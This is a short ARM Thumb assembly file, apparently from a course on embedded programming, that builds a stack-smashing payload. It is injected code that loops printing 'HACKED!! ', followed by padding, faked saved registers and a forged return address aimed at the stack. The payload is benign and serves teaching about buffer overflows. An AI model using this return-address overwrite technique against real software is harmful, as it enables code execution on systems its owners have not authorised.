@@@ hack/attack.s
@@@ Copyright (c) J. M. Spivey 2020
        
        .syntax unified

        .equ printf, 0x0000049c @ Address of printf
        .equ frame, 0x20003fb0  @ Captured stack pointer value in init

        .text
attack:
        sub sp, #56             @  0: Reserve stack space again
again:
        adr r0, message         @  2: Address of our message
        ldr r1, =printf+1       @  4: Absolute address for call
        blx r1                  @  6: Call printf
        b again                 @  8: Spin forever
        .pool                   @ 12: constant pool
message:
        .asciz "HACKED!! "      @ 16: string -- 10 bytes
        .balign 4, 0            @ pad to 28 bytes
        .word 1, 1, 1, 1        @ 28: fill up to 44 bytes
        .word 1, 1              @ 44: Saved r4, r5
        .word frame+1           @ 52: Faked return address
                                @ Total size 56
